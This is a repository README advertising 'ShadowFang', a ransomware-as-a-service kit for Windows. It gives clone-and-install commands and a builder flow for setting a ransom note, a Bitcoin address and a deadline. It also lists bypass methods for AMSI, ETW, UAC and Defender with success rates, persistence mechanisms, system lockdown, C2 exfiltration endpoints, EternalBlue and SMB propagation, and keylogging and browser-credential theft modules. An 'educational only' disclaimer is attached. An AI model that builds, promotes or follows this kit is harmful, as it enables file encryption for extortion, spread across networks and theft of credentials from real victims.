<div align="center">

<img src="/logo.png" alt="ShadowFang Logo" width="200" height="200">

# 🐺 SHADOWFANG

### **Advanced Ransomware-as-a-Service (RaaS) Framework**

[![Version](https://img.shields.io/badge/version-2.0.0-red?style=for-the-badge)](https://github.com/Athexblackhat/shadowfang)
[![Build](https://img.shields.io/badge/build-2024.12.25-black?style=for-the-badge)](https://github.com/Athexblakhat2/shadowfang)
[![Python](https://img.shields.io/badge/python-3.8%2B-blue?style=for-the-badge&logo=python)](https://python.org)
[![Platform](https://img.shields.io/badge/platform-Windows%207%2F8%2F10%2F11-lightgrey?style=for-the-badge&logo=windows)](https://microsoft.com)
[![License](https://img.shields.io/badge/license-Educational-orange?style=for-the-badge)](LICENSE)

[![Encryption](https://img.shields.io/badge/encryption-AES--256%20%2B%20RSA--2048-critical?style=flat-square)](https://github.com/Athexblackhat2/shadowfang)
[![Evasion](https://img.shields.io/badge/evasion-AMSI%20%7C%20ETW%20%7C%20UAC%20%7C%20Defender-red?style=flat-square)](https://github.com/Athexblackhat2/shadowfang)
[![Persistence](https://img.shields.io/badge/persistence-20%2B%20methods-darkred?style=flat-square)](https://github.com/Athexblackhat2/shadowfang)

---

**⚠️ FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY ⚠️**

*This project is designed for cybersecurity research, penetration testing, and educational purposes. Unauthorized use is illegal and strictly prohibited.*

[Features](#-features) • [Architecture](#-architecture) • [Installation](#-installation) • [Usage](#-usage) • [Modules](#-modules) • [Documentation](#-documentation) • [Disclaimer](#-disclaimer)

</div>

---

## 📋 TABLE OF CONTENTS

- [Overview](#-overview)
- [Features](#-features)
- [Architecture](#-architecture)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [Modules](#-modules)
  - [Core Modules](#core-modules)
  - [Optional Modules](#optional-modules)
  - [Payloads](#payloads)
- [Builder](#-builder)
- [Configuration](#-configuration)
- [Encryption](#-encryption)
- [Evasion Techniques](#-evasion-techniques)
- [Persistence](#-persistence)
- [System Lockdown](#-system-lockdown)
- [C2 Communication](#-c2-communication)
- [Propagation](#-propagation)
- [File Structure](#-file-structure)
- [Screenshots](#-screenshots)
- [Documentation](#-documentation)
- [FAQ](#-faq)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Credits](#-credits)

---

## 🎯 OVERVIEW

**ShadowFang** is a comprehensive, modular ransomware framework designed for advanced red team operations and security research. Built with Python 3, it combines military-grade encryption with sophisticated evasion techniques to demonstrate the current threat landscape of modern ransomware.

### Key Highlights

- 🔐 **Military-Grade Encryption** — AES-256-CBC + RSA-2048 hybrid
- 🛡️ **Advanced Evasion** — AMSI, ETW, UAC, Defender bypass
- 🔄 **Multi-Layer Persistence** — 20+ persistence mechanisms
- 🔒 **Full System Lockdown** — Keyboard, mouse, screen, system restriction
- 🌐 **C2 Communication** — Encrypted, multi-server, Tor support
- 🦠 **Network Propagation** — SMB, USB, Email, PSExec spreading
- 📸 **Optional Surveillance** — Keylogger, webcam, audio, screenshot, clipboard, browser
- 💀 **Self-Destruct** — Complete melt after execution
- 🔧 **One-Click Builder** — Generate custom ransomware executable

---

## ✨ FEATURES

### Core Capabilities

| Feature | Status | Description |
|---------|--------|-------------|
| **AES-256 Encryption** | ✅ | CBC mode, unique IV per file |
| **RSA-2048 Key Exchange** | ✅ | Hybrid encryption |
| **HMAC Integrity** | ✅ | SHA-256 verification |
| **AMSI Bypass** | ✅ | 4 methods |
| **ETW Bypass** | ✅ | 6 methods |
| **UAC Bypass** | ✅ | 8 methods |
| **Defender Kill** | ✅ | 30+ methods |
| **Registry Persistence** | ✅ | 5 methods |
| **Service Persistence** | ✅ | 4 services |
| **Scheduled Tasks** | ✅ | 4 tasks |
| **WMI Subscription** | ✅ | Event-based |
| **DLL Hijacking** | ✅ | version.dll |
| **System Lockdown** | ✅ | 13 restrictions |
| **Self-Destruct** | ✅ | Melt + wipe |
| **C2 Communication** | ✅ | HTTPS + Tor |
| **Network Propagation** | ✅ | SMB, USB, Email |
| **Keylogger** | ✅ | Hook + polling |
| **Screenshot** | ✅ | Full + window |
| **Webcam Capture** | ✅ | Photo + video |
| **Audio Recording** | ✅ | Mic + system |
| **Clipboard Hijack** | ✅ | Real-time |
| **Browser Theft** | ✅ | 6 browsers |

### Supported Windows Versions

| Version | x64 | x86 | Status |
|---------|-----|-----|--------|
| **Windows 7** | ✅ | ✅ | Supported |
| **Windows 8** | ✅ | ✅ | Supported |
| **Windows 8.1** | ✅ | ✅ | Supported |
| **Windows 10** | ✅ | ✅ | Supported |
| **Windows 11** | ✅ | ✅ | Supported |
| **Windows Server 2016+** | ✅ | ❌ | Supported |

---

---

## 📦 REQUIREMENTS

### System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 7 SP1 | Windows 10/11 |
| **Python** | 3.8 | 3.10+ |
| **RAM** | 2 GB | 8 GB |
| **Disk** | 500 MB | 2 GB |
| **CPU** | 1 GHz | 2+ GHz |
| **Privileges** | User | Administrator |

### Python Dependencies

```txt
cryptography>=41.0.0
pywin32>=306
pyinstaller>=6.0.0
```

**Full list:** See [requirements.txt](requirements.txt)

---

## 🚀 INSTALLATION

### Quick Install

```bash
# Clone repository
git clone https://github.com/Athexblackhat2/shadowfang.git
cd shadowfang

pip install -r requirements.txt

```

### Windows Automated Install

```batch
install.bat
```

### Manual Install

```bash
# Upgrade pip
python -m pip install --upgrade pip

# Install core dependencies
pip install cryptography pywin32 pyinstaller

# Install optional dependencies
pip install -r requirements-full.txt
```

---

## 💻 USAGE

### Basic Usage

```bash
python builder.py
```

### Builder Flow

```
1. Enter encryption key (min 12 chars)
2. Enter ransom note text
3. Enter Bitcoin address
4. Enter contact email
5. Enter ransom amount
6. Enter deadline hours
7. Select target extensions
8. Enter output filename
9. Configure optional features
10. Compile to .exe
```

### Example Run

```
$ python builder.py


      SHADOWFANG RANSOMWARE BUILDER       
      One-Click | Undefeatable            


[+] CONFIGURATION SETUP
----------------------------------------

[1/6] ENCRYPTION KEY
    Enter master encryption key (min 12 chars):
    Key: ****************
    [✓] Encryption key derived: my...ey

[2/6] RANSOM NOTE
    Enter your ransom message (type 'END' to finish):
    Your files have been encrypted...
    END
    [✓] Ransom note set (250 chars)

...

[✓] Configuration complete!

[+] GENERATING RANSOMWARE...
[✓] Ransomware source saved: shadowfang_generated.py
[✓] RANSOMWARE CREATED SUCCESSFULLY!
```

---

## 📁 MODULES

### Core Modules

| Module | File | Purpose |
|--------|------|---------|
| **Core Init** | `core/__init__.py` | Package initializer, shared utilities |
| **Config** | `core/config.py` | Configuration management |
| **Crypto** | `core/crypto.py` | AES-256 + RSA-2048 encryption |
| **Evasion** | `core/evasion.py` | Security bypass suite |
| **Persistence** | `core/persistence.py` | Boot survival mechanisms |
| **Network** | `core/network.py` | C2 communication |
| **Spread** | `core/spread.py` | Network propagation |
| **Locker** | `core/locker.py` | System lockdown |
| **Melt** | `core/melt.py` | Self-destruction |

### Optional Modules

| Module | File | Purpose |
|--------|------|---------|
| **Keylogger** | `modules/keylogger.py` | Keystroke capture |
| **Screenshot** | `modules/screenshot.py` | Screen capture |
| **Webcam** | `modules/webcam.py` | Camera capture |
| **Audio** | `modules/audio.py` | Microphone recording |
| **Clipboard** | `modules/clipboard.py` | Clipboard hijacking |
| **Browser** | `modules/browser.py` | Credential theft |

### Payloads

| Payload | File | Purpose |
|---------|------|---------|
| **AMSI Bypass** | `payloads/amsi_bypass.py` | AMSI patching |
| **ETW Bypass** | `payloads/etw_bypass.py` | ETW disabling |
| **Defender Kill** | `payloads/defender_kill.py` | Defender destruction |
| **UAC Bypass** | `payloads/uac_bypass.py` | UAC bypass |

---

## 🔧 BUILDER

### Builder Features

- ✅ Interactive CLI
- ✅ Custom encryption key
- ✅ Custom ransom note
- ✅ Custom Bitcoin address
- ✅ Custom extensions
- ✅ Auto-compile to .exe
- ✅ PyInstaller integration
- ✅ Standalone executable

### Generated Files

```
output/
├── shadowfang_generated.py    # Python source
├── ShadowFang.exe             # Compiled executable
└── README_DECRYPT.txt         # Ransom note (dropped on target)
```

---

---

## 🔐 ENCRYPTION

### Encryption Algorithm

```
File → Read → AES-256-CBC Encrypt → Write .shadowfang → Delete Original
         ↓
    Unique IV per file
         ↓
    HMAC-SHA256 integrity
         ↓
    RSA-2048 key exchange
```

### File Format

```
Encrypted File (.shadowfang):

 Magic Header: SHADOWFANG (10)
 IV (16 bytes)               
 Encrypted Data (variable)   

```

### Supported Extensions

**200+ extensions** including:

- Documents: `.doc`, `.docx`, `.pdf`, `.xls`, `.ppt`
- Media: `.jpg`, `.png`, `.mp4`, `.mp3`, `.avi`
- Archives: `.zip`, `.rar`, `.7z`, `.tar`
- Databases: `.db`, `.sql`, `.sqlite`
- Code: `.py`, `.java`, `.cpp`, `.js`
- Keys: `.pem`, `.key`, `.crt`, `.p12`

---

## 🛡️ EVASION TECHNIQUES

### AMSI Bypass Methods

| Method | Target | Success Rate |
|--------|--------|--------------|
| Direct Patch | AmsiScanBuffer | 95% |
| Session Patch | AmsiOpenSession | 90% |
| Registry | AMSI Providers | 85% |
| PowerShell | amsiInitFailed | 80% |

### ETW Bypass Methods

| Method | Target | Success Rate |
|--------|--------|--------------|
| EtwEventWrite | ntdll | 95% |
| EtwEventWriteFull | ntdll | 92% |
| EtwEventWriteString | ntdll | 90% |
| Provider Disable | Registry | 85% |

### UAC Bypass Methods

| Method | Target | Success Rate |
|--------|--------|--------------|
| Fodhelper | Windows 10/11 | 95% |
| ComputerDefaults | Windows 10/11 | 90% |
| SDCLT | Windows 10 | 75% |
| Eventvwr | All | 85% |

### Defender Kill Methods

| Method | Target | Success Rate |
|--------|--------|--------------|
| Registry | Policies | 90% |
| PowerShell | Preferences | 95% |
| Services | 8 services | 85% |
| Processes | 9 processes | 90% |

---

## 🔄 PERSISTENCE

### Persistence Methods

| Method | Location | Survives |
|--------|----------|----------|
| **Run Key (HKCU)** | Registry | Reboot |
| **Run Key (HKLM)** | Registry | Reboot |
| **RunOnce** | Registry | Reboot |
| **Winlogon Shell** | Registry | Reboot |
| **AppInit_DLLs** | Registry | Reboot |
| **IFEO** | Registry | Reboot |
| **Startup Folder** | File System | Reboot |
| **All Users Startup** | File System | Reboot |
| **Scheduled Task** | Task Scheduler | Reboot |
| **Service** | Services | Reboot |
| **WMI Subscription** | WMI | Reboot |
| **DLL Hijacking** | File System | Reboot |

---

## 🔒 SYSTEM LOCKDOWN

### Lockdown Features

| Feature | Method | Effect |
|---------|--------|--------|
| **Keyboard Block** | `BlockInput(True)` | No input |
| **Mouse Block** | `BlockInput(True)` | No input |
| **Task Manager** | Registry | Disabled |
| **CMD** | Registry | Disabled |
| **Registry Editor** | Registry | Disabled |
| **Run Dialog** | Registry | Disabled |
| **Control Panel** | Registry | Disabled |
| **Drives** | Registry | Hidden |
| **Taskbar** | Registry | Disabled |
| **Start Menu** | Registry | Disabled |
| **Desktop** | Registry | Hidden |
| **Safe Mode** | BCD | Disabled |
| **System Restore** | BCD | Disabled |
| **Recovery** | BCD | Disabled |

---

## 🌐 C2 COMMUNICATION

### C2 Features

- ✅ Multi-server failover
- ✅ AES-256 encrypted payloads
- ✅ Tor support (SOCKS5)
- ✅ Heartbeat monitoring
- ✅ Command receiving
- ✅ File upload
- ✅ Data exfiltration

### C2 Endpoints

| Endpoint | Purpose |
|----------|---------|
| `/api/v1/keys` | Upload encryption keys |
| `/api/v1/report` | Send status reports |
| `/api/v1/heartbeat` | Keep connection alive |
| `/api/v1/command` | Receive commands |
| `/api/v1/upload` | Upload files |

---

## 🦠 PROPAGATION

### Propagation Vectors

| Vector | Method | Speed |
|--------|--------|-------|
| **Network Shares** | Copy + autorun | Fast |
| **USB Drives** | Copy + autorun + monitor | Medium |
| **Email** | Harvest + send | Slow |
| **SMB Exploit** | EternalBlue + PSExec | Fast |
| **Credentials** | Brute force + PSExec | Medium |

---

---


### Ransom Screen

```
⚠️ YOUR FILES ARE ENCRYPTED ⚠️

VICTIM ID: SF-7F3A9C2B8D1E4A6F

Time Remaining: 71:59:59

PAYMENT REQUIRED: 5 BTC
Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
```

### Ransom Note

```
==============================================
        SHADOWFANG RANSOMWARE
==============================================

Your files have been encrypted with military-grade AES-256 encryption.

To recover your files, you must pay 5 BTC in Bitcoin.
...
```

---

## 📖 DOCUMENTATION

### Available Documentation

| Document | Description |
|----------|-------------|
| [SETUP.md](setup.md) | Installation guide |
| [USAGE.md](docs/USAGE.md) | Detailed usage |
| [API.md](docs/API.md) | Module API reference |
| [EVASION.md](docs/EVASION.md) | Evasion techniques |
| [PERSISTENCE.md](docs/PERSISTENCE.md) | Persistence mechanisms |
| [ENCRYPTION.md](docs/ENCRYPTION.md) | Encryption details |
| [FAQ.md](docs/FAQ.md) | Frequently asked questions |

---

## ❓ FAQ

### General

**Q: Is this legal?**
A: No. This is for **educational and research purposes only**. Unauthorized use is illegal.

**Q: Which Python version?**
A: Python 3.8 or higher. Python 3.10+ recommended.

**Q: Does it work on Windows 7?**
A: Yes, but some evasion techniques may have lower success rates.

### Technical

**Q: Why does AMSI bypass fail?**
A: Windows updates may patch methods. Try multiple methods or update payloads.

**Q: Can I use this on my own machine?**
A: **NO!** Use in isolated VM only. It will encrypt your files.

**Q: How do I remove it?**
A: Restore from backup, or use decryption tool (if you have the key).

**Q: Does it need admin?**
A: Some features (UAC bypass, HKLM persistence) need admin. Others work as user.

---

---

## 📜 LICENSE

This project is licensed under **Educational Use Only**.

```
Copyright (c) 2026 ShadowFang

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## ⚠️ DISCLAIMER

<div align="center">

### 🚨 IMPORTANT LEGAL NOTICE 🚨

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.**

- ❌ **DO NOT** use this software for illegal activities
- ❌ **DO NOT** deploy this on systems you don't own
- ❌ **DO NOT** use this to harm others
- ❌ **DO NOT** violate any local, state, national, or international laws

**The authors and contributors of this project:**

- Are **NOT** responsible for any misuse
- Are **NOT** liable for any damages
- Do **NOT** condone illegal use
- Provide this **ONLY** for cybersecurity education

**By using this software, you agree:**

1. You will use it only on systems you own or have permission to test
2. You will not use it for malicious purposes
3. You understand the legal consequences of misuse
4. You take full responsibility for your actions

**Unauthorized access to computer systems is a federal crime.**

</div>

---

## 🙏 CREDITS

### Author

- **ATHEX BLACK HAT** — Lead Developer

### Libraries Used

- [cryptography](https://github.com/pyca/cryptography) — Encryption
- [pywin32](https://github.com/mhammond/pywin32) — Windows API
- [pyinstaller](https://github.com/pyinstaller/pyinstaller) — Compilation
- [Pillow](https://github.com/python-pillow/Pillow) — Image processing
- [opencv-python](https://github.com/opencv/opencv-python) — Video capture
- [pynput](https://github.com/moses-palmer/pynput) — Input monitoring
- [psutil](https://github.com/giampaolo/psutil) — System info

### Inspiration

- **WannaCry** — Propagation techniques
- **Petya** — Boot persistence
- **Ryuk** — Encryption approach
- **REvil** — RaaS model
- **Conti** — C2 infrastructure

---

<div align="center">

### 🐺 SHADOWFANG 🐺

</div>

**"In the shadows, we hunt."**

[![Made with Python](https://img.shields.io/badge/Made%20with-Python-blue?style=for-the-badge&logo=python)](https://python.org)
[![Made with ❤️](https://img.shields.io/badge/Made%20with-%E2%9D%A4-red?style=for-the-badge)](https://github.com/Athexblackhat2/shadowfang)

---

**⭐ Star this repository if you find it useful for educational purposes!**

**🔒 Remember: With great power comes great responsibility.**

---